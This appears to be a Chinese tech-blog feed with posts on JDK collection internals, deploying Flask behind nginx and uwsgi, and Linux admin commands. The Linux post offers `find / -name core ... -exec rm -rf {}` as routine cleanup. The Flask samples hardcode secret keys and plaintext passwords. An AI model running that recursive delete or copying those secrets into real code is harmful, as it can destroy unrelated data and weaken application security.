lists (such as LinkedList). Generic list algorithms are encouraged to check whether the given list is an instanceof this interface before applying an algorithm that would provide poor performance if it were applied to a sequential access list, and to alter their behavior if necessary to guarantee acceptable performance.* It is recognized that the distinction between random and sequential access is often fuzzy. For example, some List implementations provide asymptotically linear access times if they get huge, but constant access times in practice. Such a List implementation should generally implement this interface. As a rule of thumb, a List implementation should implement this interface if, for typical instances of the class, this loop: for (int i=0, n=list.size(); i &lt; n; i++) list.get(i); //get的速度应该是恒定的 runs faster than this loop: for (Iterator i=list.iterator(); i.hasNext(); ) i.next(); 这种接口就是给外界使用者看的，用来说明该集合支持这种通过下标查找（速度不变）的快速操作 实践表明，对于linkedList，采用for loop的方式要很慢，但使用ListIterator的方式，速度并不慢，简单来想，沿着链表的一个方向一致往下走就是了嘛。一些经验表明(摘自简书作者嘟爷MD的文章) ArryList和LinkedList的对比结论 1、顺序插入速度ArrayList会比较快2、LinkedList将比ArrayList更耗费一些内存3、ArrayList的遍历效率会比LinkedList的遍历效率高一些4、有些说法认为LinkedList做插入和删除更快，这种说法其实是不准确的：如果增加或者删除的元素在前半部分的时候，ArrayList会频繁调用System.arrayCopy方法，虽然native方法快，但高频率调用肯定慢，至少比不上移动指针。 2. Map的几个实现类2.1 HashMap源码解析 public class HashMap extends AbstractMap implements Map, Cloneable, Serializable HashMap不是线程安全的，Key和Value都有可能为null，存储数据不是有序的(get的顺序不是put的顺序)。比较专业的说法是 链表数组结构。 HashMap中有几个默认值常量 默认初始容量是16 static final int DEFAULT_INITIAL_CAPACITY = 1 &lt;&lt; 4; // aka 16 默认加载因子是0.75f ，加载因子是指Hashmap在自动扩容之前可以达到多满 static final float DEFAULT_LOAD_FACTOR = 0.75f; //一般不需要改 构造函数有好几个 public HashMap(int initialCapacity, float loadFactor) //自定义加载因子，比较玄学 public HashMap(int initialCapacity) // 避免扩容，和ArrayList初始化指定容量类似的道理 public HashMap() //直接把初始容量设置成16 public HashMap(Map&lt;? extends K, ? extends V&gt; m) 注意这个初始容量必须是2的n次方 来看常见的CURD操作(jdk 1.8源码，和我在网上找到的jdk1.6源码有一些变化了) public V put(K key, V value) { return putVal(hash(key), key, value, false, true); //HashMap允许key为null,key为null的话，直接放到数组的0的位置（hash方法返回的是0） } static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16); //如果是null，放到数组的第一个 // 这里面就是HashMap算法的高明之处 ， // 1. 首先算出object的hashcode， //2.然后根据上述公式将二进制的1尽量分散的均匀一点 // 3. 在putVal的时候将这个值跟数组的长度length-1进行位运算，得到一个比length小的正数，作为这个新元素在数组中的index.但这样仍不免会产生冲突(hash Collision) } /** * Implements Map.put and related methods * * @param hash hash for key * @param key the key * @param value the value to put * @param onlyIfAbsent if true, don&#39;t change existing value * @param evict if false, the table is in creation mode. * @return previous value, or null if none */ final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) { Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i; if ((tab = table) == null || (n = tab.length) == 0) n = (tab = resize()).length; //table为成员变量，是一个Node数组，为空的话则创建 。在resize中创建 if ((p = tab[i = (n - 1) &amp; hash]) == null) tab[i] = newNode(hash, key, value, null); else { Node&lt;K,V&gt; e; K k; if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) e = p; //Table数组中找到了这个下标的元素，直接指定 else if (p instanceof TreeNode)//p可以理解为previous 。 如果发现这个节点是一棵树（红黑树？） e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value); else {//否则该节点是链表，各个元素之间手拉手的那种 for (int binCount = 0; ; ++binCount) { if ((e = p.next) == null) { p.next = newNode(hash, key, value, null); //找到这个链表的尾巴了 if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st treeifyBin(tab, hash); break; } if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) break; p = e; } } if (e != null) { // existing mapping for key V oldValue = e.value; if (!onlyIfAbsent || oldValue == null) e.value = value; afterNodeAccess(e); //回调函数 return oldValue; } } ++modCount; if (++size &gt; threshold) resize(); afterNodeInsertion(evict);//回调函数 return null; } get方法 public V get(Object key) { Node&lt;K,V&gt; e; return (e = getNode(hash(key), key)) == null ? null : e.value;//根据key来找value } /** * Implements Map.get and related methods * * @param hash hash for key * @param key the key * @return the node, or null if none */ final Node&lt;K,V&gt; getNode(int hash, Object key) { Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; int n; K k; if ((tab = table) != null &amp;&amp; (n = tab.length) &gt; 0 &amp;&amp; (first = tab[(n - 1) &amp; hash]) != null) { //table不为空说明曾经put过 if (first.hash == hash &amp;&amp; // always check first node ((k = first.key) == key || (key != null &amp;&amp; key.equals(k)))) return first; if ((e = first.next) != null) { if (first instanceof TreeNode) return ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key); do { if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) return e; } while ((e = e.next) != null); } } return null; } public V get(Object key) { Node&lt;K,V&gt; e; return (e = getNode(hash(key), key)) == null ? null : e.value; } /** * Implements Map.get and related methods * * @param hash hash for key * @param key the key * @return the node, or null if none */ final Node&lt;K,V&gt; getNode(int hash, Object key) { Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; int n; K k; if ((tab = table) != null &amp;&amp; (n = tab.length) &gt; 0 &amp;&amp; (first = tab[(n - 1) &amp; hash]) != null) { if (first.hash == hash &amp;&amp; // always check first node ((k = first.key) == key || (key != null &amp;&amp; key.equals(k)))) return first; if ((e = first.next) != null) { if (first instanceof TreeNode) return ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key); do { if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) return e; //可以看出比较的方式就是hash（int）相等且key(指针相等) 或者key equals(所以经常说重写equals需要确保hashcode一致，这里至少反应了这一点) } while ((e = e.next) != null); } } return null; } 回想一下平时迭代一个HashMap的方式 long i = 0; Iterator&lt;Map.Entry&lt;Integer, Integer&gt;&gt; it = map.entrySet().iterator(); while (it.hasNext()) { Map.Entry&lt;Integer, Integer&gt; pair = it.next(); //上面的get也是这种不断查找next的方式 i += pair.getKey() + pair.getValue(); } entrySet方法是Map接口定义的 Set&lt;Map.Entry&lt;K, V&gt;&gt; entrySet(); * Returns a Set view of the mappings contained in this map. * The set is backed by the map, so changes to the map are * reflected in the set, and vice-versa. If the map is modified * while an iteration over the set is in progress (except through * the iterator&#39;s own &lt;tt&gt;remove&lt;/tt&gt; operation, or through the * &lt;tt&gt;setValue&lt;/tt&gt; operation on a map entry returned by the * iterator) the results of the iteration are undefined. The set * supports element removal, which removes the corresponding * mapping from the map, via the &lt;tt&gt;Iterator.remove&lt;/tt&gt;, * &lt;tt&gt;Set.remove&lt;/tt&gt;, &lt;tt&gt;removeAll&lt;/tt&gt;, &lt;tt&gt;retainAll&lt;/tt&gt; and * &lt;tt&gt;clear&lt;/tt&gt; operations. It does not support the * &lt;tt&gt;add&lt;/tt&gt; or &lt;tt&gt;addAll&lt;/tt&gt; operations. * * @return a set view of the mappings contained in this map 大致意思是： 返回一个能够反映该map元素组合的一个Set，对这个Set的操作都将反映到原map上，反之亦然。在通过entrySet迭代这个map的时候，除了remove和操作操作都是不被支持的。返回的Set支持删除对应的mapping组合。但不支持add操作 HashMap内部保留了一个这样的成员变量：transient Set&lt;Map.Entry&gt; entrySet; //成员变量具体实现enterySet方法的地方： public Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet() { Set&lt;Map.Entry&lt;K,V&gt;&gt; es; return (es = entrySet) == null ? (entrySet = new EntrySet()) : es; } // 这个EntrySet大致长这样 final class EntrySet extends AbstractSet&lt;Map.Entry&lt;K,V&gt;&gt; { public final int size() { return size; } public final void clear() { HashMap.this.clear(); } public final Iterator&lt;Map.Entry&lt;K,V&gt;&gt; iterator() { return new EntryIterator(); } public final boolean contains(Object o) { if (!(o instanceof Map.Entry)) return false; Map.Entry&lt;?,?&gt; e = (Map.Entry&lt;?,?&gt;) o; Object key = e.getKey(); Node&lt;K,V&gt; candidate = getNode(hash(key), key); return candidate != null &amp;&amp; candidate.equals(e); } public final boolean remove(Object o) { if (o instanceof Map.Entry) { Map.Entry&lt;?,?&gt; e = (Map.Entry&lt;?,?&gt;) o; Object key = e.getKey(); Object value = e.getValue(); return removeNode(hash(key), key, value, true, true) != null; } return false; } } 整理的关键在于removeNode方法，和getNode和putVal很像 final Node&lt;K,V&gt; removeNode(int hash, Object key, Object value, boolean matchValue, boolean movable) { Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, index; if ((tab = table) != null &amp;&amp; (n = tab.length) &gt; 0 &amp;&amp; (p = tab[index = (n - 1) &amp; hash]) != null) { Node&lt;K,V&gt; node = null, e; K k; V v; if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) node = p; else if ((e = p.next) != null) { if (p instanceof TreeNode) node = ((TreeNode&lt;K,V&gt;)p).getTreeNode(hash, key); else { do { if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) { node = e; break; } p = e; } while ((e = e.next) != null); } } //先把p(previous)找出来，这里的matchValue和movable都是true // node 就是包含了要移出对象的Node if (node != null &amp;&amp; (!matchValue || (v = node.value) == value || (value != null &amp;&amp; value.equals(v)))) { if (node instanceof TreeNode) ((TreeNode&lt;K,V&gt;)node).removeTreeNode(this, tab, movable); else if (node == p) //数组这个位置就一个 tab[index] = node.next;//直接指向下一个 else p.next = node.next; //数组这个位置指向链表下一个节点，释放引用 ++modCount; --size; afterNodeRemoval(node); return node; } } return null; } 比较元素是否相同的关键是 e.hash == hash || (key!=null &amp;&amp;key.equals(k)) //后半部分其实也是比较hashCode 另外一些平时常用的方法包括： public boolean containsKey(Object key) { return getNode(hash(key), key) != null; //就是检查下有没有这个key对应的Node } public boolean containsValue(Object value) { Node&lt;K,V&gt;[] tab; V v; if ((tab = table) != null &amp;&amp; size &gt; 0) { for (int i = 0; i &lt; tab.length; ++i) { for (Node&lt;K,V&gt; e = tab[i]; e != null; e = e.next) { if ((v = e.value) == value || (value != null &amp;&amp; value.equals(v))) return true; //遍历内部的数组，仅此而已 } } } return false; } 和ArrayList、LinkedList比起来，HashMap的源码要麻烦许多，这里面涉及到hashCode，链表，红黑树。需要一点数据结构的知识。另外，HashMap还针对hashCode冲突（hash Collision，不同的Object居然有相同的hashCode）的情况作了预处理通俗的来说，HashMap内部维护了一个数组，每一个数组元素内部不一定只有一个，有可能是一个链表。每次添加(key,value)不是盲目的往这个数组里面塞，而是算下key的hash值，放到对应的节点上。如果这个节点上还没有元素，直接放就好了。如果有的话，新加入的value将被作为原有元素的Next(外部调用get的时候，先根据传入的key的hashCode找到节点，然后根据key.equals来找)。简单如此，精致如斯。 2.2 LinkedHashMappublic class LinkedHashMap extends HashMap implements MapHashMap源码我看了下有两千多行，LinkedHashMap只有七百多行，显然这是继承带来的简便之处。关键的成员变量final boolean accessOrder; 默认是false The iteration ordering method for this linked hash map: truefor access-order, false for insertion-order. LinkedHashMap常用的属性就是它支持有序，这个有序是指迭代的时候有序HashMap用来存放和获取对象，而双向链表用来实现有序 2.3 SparseArray先来看一段崩溃日志 Fatal Exception: java.lang.ArrayIndexOutOfBoundsException: src.length=509 srcPos=60 dst.length=509 dstPos=61 length=-60 at java.lang.System.arraycopy(System.java:388) at com.android.internal.util.GrowingArrayUtils.insert(GrowingArrayUtils.java:135) at android.util.SparseIntArray.put(SparseIntArray.java:144) 简单分析一下， GrowingArrayUtils.java /** * Primitive int version of {@link #insert(Object[], int, int, Object)}. */ public static int[] insert(int[] array, int currentSize, int index, int element) { assert currentSize &lt;= array.length; if (currentSize + 1 &lt;= array.length) { System.arraycopy(array, index, array, index + 1, currentSize -index); array[index] = element; return array; } int[] newArray = new int[growSize(currentSize)]; System.arraycopy(array, 0, newArray, 0, index); newArray[index] = element; System.arraycopy(array, index, newArray, index + 1, array.length - index); return newArray; } public static void arraycopy(int[] src, int srcPos, int[] dst, int dstPos, int length) { if (src == null) { throw new NullPointerException(&quot;src == null&quot;); } if (dst == null) { throw new NullPointerException(&quot;dst == null&quot;); } if (srcPos &lt; 0 || dstPos &lt; 0 || length &lt; 0 || srcPos &gt; src.length - length || dstPos &gt; dst.length - length) { throw new ArrayIndexOutOfBoundsException( &quot;src.length=&quot; + src.length + &quot; srcPos=&quot; + srcPos + &quot; dst.length=&quot; + dst.length + &quot; dstPos=&quot; + dstPos + &quot; length=&quot; + length); //对照着崩溃日志，length传了个-60进来，而srcPos = 60。显然是有其他线程在SparseArray.put调用后，在GrowingArrayUtils.insert调用前做了一次clear操作。怎么办，加锁呗。 } } 很显然这段话是因为length= -60导致崩溃，应该是mSize被设置为0(其他线程调用了clear方法，clear只是设置mSize = 0) 重现了一下： @Override public void onClick(View v) { executor = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors()); for (int i = 0; i &lt; 1000; i++) { if (i %2==0) { executor.execute(new closer(sparseIntArray)); continue; } executor.execute(new writer(sparseIntArray, i)); } } static class writer implements Runnable { SparseIntArray array; int index; public writer(SparseIntArray array, int index) { this.array = array; this.index = index; } @Override public void run() { array.put(index, (int) Thread.currentThread().getId()); LogUtil.p(&quot;write to &quot;+index); } } static class closer implements Runnable { SparseIntArray array; public closer(SparseIntArray array) { this.array = array; } @Override public void run() { array.clear(); LogUtil.e(&quot;clear array&quot;); } } 果然: 08-21 15:26:27.600 23165-23207/com.harris.simplezhihu E/AndroidRuntime: FATAL EXCEPTION: pool-1-thread-4 Process: com.harris.simplezhihu, PID: 23165 java.lang.ArrayIndexOutOfBoundsException: src.length=21 srcPos=1 dst.length=21 dstPos=2 length=-1 at java.lang.System.arraycopy(System.java:388) at com.android.internal.util.GrowingArrayUtils.insert(GrowingArrayUtils.java:135) at android.util.SparseIntArray.put(SparseIntArray.java:143) at com.harris.simplezhihu._07_sparsearry_concurrent.SpareArrayCrashActivity$writer.run(SpareArrayCrashActivity.java:61) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1113) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:588) at java.lang.Thread.run(Thread.java:818) SparseArry提供了类似于HashMap的调用接口， 使用SparseArray的初衷还是在android这种内存比cpu金贵的平台中，使用SparseArry相比HashMap能够减轻内存压力，获得更好的性能。liaohuqiu指出SparseArry并不是任何时候都更快，主要是节省内存，避免autoBoxing，二分法查找对于cpu的消耗需要权衡。尤其是存储的量很大的时候，二分法查找的速度会很慢。 SparseArry类似的class有好几个，据说有八个，以SparseIntArry为例SparseIntArry的几个常用方法,值得注意的是 clear方法只不过是把mSize设置为0。remove(key)只是把这个key对应位置value设置为DELETED.内部的mKeys是有序的int[],long[]。这样才能实现二分法查找。 public int indexOfKey(int key) public int indexOfValue(int value) public int get(int key) public void put(int key, int value) public void clear() { mSize = 0; } //迭代一个SparseArry的方法 for(int i = 0; i &lt; sparseArray.size(); i++) { int key = sparseArray.keyAt(i); // get the object by the key. Object obj = sparseArray.get(key); } // 从源码来看变量结构 public class SparseIntArray implements Cloneable{ private int[] mKeys; private int[] mValues; private int mSize; } public void put(int key, int value) { int i = ContainerHelpers.binarySearch(mKeys, mSize, key); //二分法查找 if (i &gt;= 0) { mValues[i] = value; //找到了在Value数组中的index,直接替换掉 } else { i = ~i; mKeys = GrowingArrayUtils.insert(mKeys, mSize, i, key); mValues = GrowingArrayUtils.insert(mValues, mSize, i, value); mSize++; } } // GrowwingArrayUtils.java /** * Primitive int version of {@link #insert(Object[], int, int, Object)}. */ public static int[] insert(int[] array, int currentSize, int index, int element) { assert currentSize &lt;= array.length; if (currentSize + 1 &lt;= array.length) { System.arraycopy(array, index, array, index + 1, currentSize - index); array[index] = element; return array; } int[] newArray = new int[growSize(currentSize)]; System.arraycopy(array, 0, newArray, 0, index); newArray[index] = element; System.arraycopy(array, index, newArray, index + 1, array.length - index); return newArray; } SparseArray廖祜秋 特地强调 SparseArray 是针对HashMap做的优化。 1.HashMap 内部的存储结构，导致一些内存的浪费。 2.在刚扩容完，SparseArray 和 HashMap 都会存在一些没被利用的内存。 SparseArray 并不是任何时候都会更快，有时反而会更慢vauleAt和keyAt接收一个index参数(数组下标)，这个参数应该是key对应的BinarySearch得到的值。 2.4 ArrayMap3. Set的介绍Set用比较少，HashSet、TreeSet和LinkedHashSet是jdk的实现类 public class HashSet extends AbstractSet implements Set, Cloneable, java.io.SerializableSet的重要特点就是不能放进去重复的元素，Set中不会存在e1和e2，e1.equals(e2)的情况HashSet的源码只有三百多行，内部有一个map（HashMap）相对来说是比较简单的。其实Set平时用的也不是那么多。。。 4. 一些不常用的类Vetor，Stack，ArrayDeque,Queue Vector属于List,线程安全，但效率低（就是简单的在所有方法前面加上了synchronized） Queue是一个interface，属于两端可以出入的List，通常是(FIFO模式)，实现类有 PriorityQueue， java.util.concurrent.ArrayBlockingQueue java.util.concurrent.LinkedBlockingQueue java.util.concurrent.PriorityBlockingQueue 作者都是大名鼎鼎的Doug Lea 另外，LinkedList也能直接拿来当做queue使用 Stack是Vector的子类(属于LIFO的栈) The Stack class represents a last-in-first-out (LIFO) stack of object Deque(双端队列) 5. concurrentHashMap等jdk1.8的concurrentHashMap不是用synchronized实现的，是Doug Lea使用CAS操作写的，非常高效。concurrentHashMap的原理是分段锁(jdk 1.7) 6. WeakHaskMapWeakHashMap的Key是WeakReference，但Value不是。常见用法 String a = &quot;a&quot;; map.put(1,a); a = null; //map中的a可以出了map自身外没有其他地方被引用，a将被被gc回收 Android 官方开发文档上指出了一点 Implementation note: The value objects in a WeakHashMap are held by ordinary strong references. Thus care should be taken to ensure that value objects do not strongly refer to their own keys, either directly or indirectly, since that will prevent the keys from being discarded. Note that a value object may refer indirectly to its key via the WeakHashMap itself; that is, a value object may strongly refer to some other key object whose associated value object, in turn, strongly refers to the key of the first value object. If the values in the map do not rely on the map holding strong references to them, one way to deal with this is to wrap values themselves within WeakReferences before inserting, as in: m.put(key, new WeakReference(value)), and then unwrapping upon each get. WeakHashMap的value不要持有key的强引用，否则，key永远不会被清除,value也别想被清除。 7. java 8的一些新的方法list.replaceAll(String::toUpperCase) //method referencecan not change the elemeet type, for that you need an streamCollections Refuled by Stuart MarksputIfAbsent是Atmmic的Is putIfAbsent an atomic operation 8.结束语8.1 Doug Lea 是非常聪明的人，估计并发经常会牵涉到集合，所以jdk里面很多集合都有他的作品8.2 jdk只是定义了这些框架，像List，Map这些全都是接口，完全可以自己去实现。Apache就有一大堆适合特定场景的集合实现类。jdk只是帮助我们实现了一些常见的类。如果有现成的满足需求的框架，不要重复造轮子。8.3 平时只要记住ArrayList和HashMap的大致内部实现就可以了，至于别的，除非面试，平时没必要记录。8.4 Stuart Mark特别喜欢把一个class搞成@deprecated8.5 就连Joshua Bloch 都承认，除非性能真的很重要的，平时没必要过度优化。By the way , he said Doug Lea is very smart .8.6 Stack这种东西有点过时了 一个原因是Stack extends Vector（每个方法都加synchronized，多数场景下不需要，另外Vector是1.1还是1.0就有了） updatejdk 1.8对于长度超过8的链表改用红黑树。 Reference Collections Refuled by Stuart Marks From Java Code to Java Heap: Understanding the Memory Usage of Your Application Java集合干货系列 Arrays.asList()返回的List不是jva.util.ArrayList WeakHashMap和HashMap的区别 Hashmap的死锁问题 Young Pups: New Collections APIs for Java 9 by Stuart Marks","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"}]},{"title":"在ubuntu服务器上部署wsgi application","date":"2017-06-25T22:46:23.000Z","path":"2017/06/25/2017-06-25-deploying-flask-app-on-linux-server/","text":"1. virtualenv 好习惯sudo pip install virtualenv sudo virtualenv venv source venv/bin/activate sudo pip install Flask ## virtualenv指定python版本 virtualenv env --python=python2.7 virtualenv -p&quot;$(which python3.6)&quot; TEST ##linux这个也行 mkvirtualenv --python=`which python3` &lt;env_name&gt; ## 这个居然也行 # sudo python __init__.py sudo /var/www/FlaskApp/FlaskApp/venv/bin/python2 __init__.py deactivate # exit Windows环境下安装virtualenv类似 在pycharm的cmd窗口中， 执行pip install virtualenv virtualenv env #会生成一个新的ENV文件夹 cd env /Scripts activate.bat # 此时光标变成(env) &gt;. 退出很简单deactivate.bat即可 mac和linux平台下 source ./env/bin/activate 2. flask+nginx+wsgiDigital Ocean总有很多实用的教程,跟这个这里面的教程去部署flask app多半会碰到nginx 502。原因是生成的.sock文件的权限不对，所以在ini文件里面加上 chmod-socket = 666 在venv里面不要用pip3，用pip wsgi协议的app跑起来之后是没有办法直接通过http去请求的，要让nginx转发一下。生成的.sock文件就是用来和nginx通信的。这时候的在浏览器里面访问的port就是nginx决定的了。wsgi的文档应该在pep-333里面 另外，通过uwsgi跑起来的托管在Ngixn上的app如果server端报错的话，可以sudo systemctl status yourservicefilename 去查看具体的报错原因，比起本地开发还是麻烦了一点点 3. flask的一大堆extensions官方列举出的Extensions有很多 flask-jwt(似乎已经很久没人维护了))from flask import Flask from flask_jwt import JWT, jwt_required, current_identity from werkzeug.security import safe_str_cmp class User(object): def __init__(self, id, username, password): self.id = id self.username = username self.password = password def __str__(self): return &quot;User(id=&#39;%s&#39;)&quot; % self.id users = [ User(1, &#39;user1&#39;, &#39;abcxyz&#39;), User(2, &#39;user2&#39;, &#39;abcxyz&#39;), ] username_table = {u.username: u for u in users} userid_table = {u.id: u for u in users} def authenticate(username, password): user = username_table.get(username, None) if user and safe_str_cmp(user.password.encode(&#39;utf-8&#39;), password.encode(&#39;utf-8&#39;)): return user def identity(payload): user_id = payload[&#39;identity&#39;] return userid_table.get(user_id, None) app = Flask(__name__) app.debug = True app.config[&#39;SECRET_KEY&#39;] = &#39;super-secret&#39; app.config[&#39;JWT_AUTH_HEADER_PREFIX&#39;] = &#39;awesome&#39; ##设置header中的Authorization: JWT xxxxx中的JWT三个字 jwt = JWT(app, authenticate, identity) @app.route(&#39;/protected&#39;) @jwt_required() def protected(): return &#39;%s&#39; % current_identity if __name__ == &#39;__main__&#39;: app.run() ## 认证接口 curl -X POST http://127.0.0.1:5000/auth --header &quot;Content-Type:application/json&quot; --data &#39;{&quot;username&quot;:&quot;user1&quot;,&quot;password&quot;:&quot;abcxyz&quot;}&#39; ## { ## &quot;access_token&quot;: &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzEyMTg0NTUsImlhdCI6MTUzMTIxODE1NSwibmJmIjoxNTMxMjE4MTU1LCJpZGVudGl0eSI6MX0.TPfb5Xwthbwnnf5P1LNB0o-CKiSis8VH0Db6JEotc9A&quot; ##} ##访问需要认证的接口 ## curl -X GET http://127.0.0.1:5000/protected --header &quot;Content-Type:application/json&quot; --header &quot;Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzEyMTg0NTUsImlhdCI6MTUzMTIxODE1NSwibmJmIjoxNTMxMjE4MTU1LCJpZGVudGl0eSI6MX0.TPfb5Xwthbwnnf5P1LNB0o-CKiSis8VH0Db6JEotc9A&quot; ## User(id=&#39;1&#39;) Flask设置cookie: from flask import Flask,make_response,request app = Flask(__name__) @app.router(&#39;/setcookie&#39;) def setcookie(): resp = make_response(&#39;Setting cookies&#39;) resp.set_cookie(&#39;framework&#39;,&#39;flask&#39;) return resp @app.route(&#39;/getcookie&#39;) def getcookie(): framework = request.cookies.get(&#39;framework&#39;) return &#39;The frame work stored in cookie is &#39;+framework if __name__ == &quot;__main__&quot;: app.run(debug=True) 设置header比如cors这种也可以 @app.route(&quot;/&quot;) def home(): resp = flask.Response(&quot;Foo bar baz&quot;) resp.headers[&#39;Access-Control-Allow-Origin&#39;] = &#39;*&#39; return resp curl -i http://127.0.0.1:5000/your/endpoint 即可(i表示include) flask操作数据库mysql 在windows下设置环境变量要用set: (env) λ set FLASK_APP=C:\\code\\realworld\\flask-realworld-example-app\\autoapp.py 后台开发环境中经常会出现500错误，这种后台app挂了的情况一般暴露给前端的响应都是一个特定的结构。实现方式的话：在flask中catch 500 error from flask import Flask ,url_for,render_template,request,abort from werkzeug.debug import get_current_traceback app = Flask(__name__) @app.route(&#39;/&#39;) def index(): try: raise Exception(&quot;Can&#39;t connect to database&quot;) except Exception,e: track= get_current_traceback(skip=1, show_hidden_frames=True, ignore_system_exceptions=False) track.log() abort(500) return &quot;index&quot; @app.route(&#39;/url&#39;) def my_method(): try: call_method_that_raises_exception() except Exception as e: render_template(&quot;500.html&quot;, error = str(e)) @app.errorhandler(500) def internal_server_error(error): app.logger.error(&#39;Server Error: %s&#39;, (error)) return render_template(&#39;500.htm&#39;), 500 @app.errorhandler(Exception) def unhandled_exception(e): app.logger.error(&#39;Unhandled Exception: %s&#39;, (e)) return render_template(&#39;500.htm&#39;), 500 if __name__== &quot;__main__&quot;: app.run(debug=True) 事实上，4XX的error是会走到用户注册的errorhandler中的，但是在debug模式下，不会走到5XX的errorhandler下面。所以生产环境下首先确保debug关闭，然后所有的错误都会走到5xx的errorhandler下面 Reference how-to-deploy-a-flask-application-on-an-ubuntu-vps","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"}]},{"title":"linux常用命令扩展","date":"2017-06-18T16:51:49.000Z","path":"2017/06/18/2017-06-18-linux-commands-extended/","text":"一些linux的常用命令，linux环境下运行server ,bash的语法 速查 清理大文件 1. 常用软件安装utorrentapache,mysql没事不要手贱升级软件 apt-get -u upgrade //就像这样，stable挺好的sudo apt updatesudo apt full-upgrade ## 更新所有软件 2. 环境变量怎么改(这个有临时改和永久生效两种)临时改（下次登录失效这种）export PATH=$PATH:/home/directory/to/the/folderecho $PATH ## 看下改好没 export FLASK_DEBUG=1$FLASK_DEBUG &gt;&gt; 1 永久生效（谨慎为之）修改/etc/profile文件：（对所有用户都生效）export PATH=”$PATH:/home/directory/to/the/folder” 修改~/.bashrc文件： （对当前用户有效）export PATH=”$PATH:/home/directory/to/the/folder” 注： 在windows下export要换成set,echo $XXX 要换成echo %XXX% 这个有效一般都需要重新注销系统才能生效 set可以查看当前用户本地shell设置的所有变量，用unset可以取消变量: setunset $SOME_PROGRAM 平时在shell中输入sudo XXX ,系统是如何知道怎么执行这条指令的呢。首先，可以查看which XXX ，用于查找某项指令对应的文件的位置。而像sudo这种都放在PATH位置，系统会在几个关键位置查找sudo命令。用户本身完全可以创建一个叫做sudo的文件chmod+X ，然后运行这个sudo。 查看PATH : echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games (注意，系统是按照这个顺序找的，如果在第一个目录下找到一个叫sudo的东西，就会直接执行了，所以这里是有潜在的危险的) 看下哪个命令对应的位置在哪里 which XXXk 比如sudo 就放在 /usr/bin/sudo $PATH 环境变量修改在~./bashrc或者 ~./profile里面 具体来说，比如要把/etc/apache/bin目录添加到PATH中 PATH=$PATH:/etc/apache/bin #只对本次会话有效 或者 PATH=$PATH:/etc/apache/bin #在~./bashrc或者~./profile里面添加这句话 比如把facebook 的buck添加到环境变量： $ cd ~ $ vim ~/.bash_profile export PATH=$HOME/buck/bin:$PATH $ source ~/.bash_profile ## 立刻生效 顺便说下widnows下怎么看环境变量： echo %path% 3. alias设置查看已经设置过的alias： alias或者 alias -pvi 中输入 /XXX 可以搜索 vi ~/.bashrc ## 这个是对当前用户生效的 /etc/bashrc 写到文件这里面是对所有用户生效 alias yourcommand=&#39;ls -alr&#39; ##添加这一行，原来的命令也照样用 重开session即可生效急着要想马上生效可以source ~/.bashrc ## source命令其实就是执行一个脚本取消的话， unalias xxx即可 touch ~/.bash_aliases ## unbuntu建议把所有的alias写到一个 ~/.bash_aliases文件里。保存之后,source ~/.bash_aliases。立即生效 据说alias是可以传参数的，不过加上&gt; /dev/null 2&gt;&amp;1 &amp; 就不行了。所以还是写个script算了。 #!/bin/bash kwrite $1 &gt; /dev/null 2&gt;&amp;1 &amp; 然后chomod 755 fileName 4. pushd和popd（类似于文件夹stack）5. linux删除垃圾文件（小硬盘linux磁盘要经常清理需要的命令）IBM给出了删除一些垃圾文件的建议使用 Linux 命令删除垃圾文件 sudo apt-get autoclean 清理旧版本的软件缓存sudo apt-get clean 清理所有软件缓存sudo apt-get autoremove 删除系统不再使用的孤立软件 autoremove有时候会报错： The link /initrd.img.old is a damaged linkRemoving symbolic link initrd.img.old you may need to re-run your boot loader[grub] 根据askubuntu的解答，不用管 &gt;du –max-depth=1 -h # 查看当前路径下所有文件/文件夹的大小du -k –max-depth=2 | sort -rn # 加上排序find / -name core -print -exec rm -rf {} \\; //分号也要，亲测find / -size +100M：列出所有大于100M的文件，亲测。靠着这个找到了shadowsocks的日志文件,170MB上面这个命令是不能列出文件大小的，还想要查看文件大小的话find / -type f -size +50M -exec du -h {} \\; | sort -nfind . -mindepth 1 -maxdepth 1 -printf ‘%f\\n’ //打印出当前目录下所有文件，基本上就是一个ls命令了find / -type f -printf ‘%T+ %p\\n’ | sort | head -n 1 //how-to-find-the-oldest-file-in-a-directory-tree，找到一个目录下最老的文件 删除/boot分区不需要的内核先df -h看/boot分区使用情况；然后 dpkg –get-selections|grep linux-image ;查看当前使用的内核 uname -a ; lsb_release -a 清理不用的内核 sudo apt-get purge linux-image-3.13.0-24-generic （注意，不要删正在使用的内核）删除不要的内核文件首先看下 uname- adpkg –get-selections|grep linux //查找所有的文件，有image的就是内核文件sudo apt-get remove 内核文件名 （例如：linux-image-4.4.0-92-generic） sudo dpkg –get-selections | awk ‘$2 !~ /^install/‘ 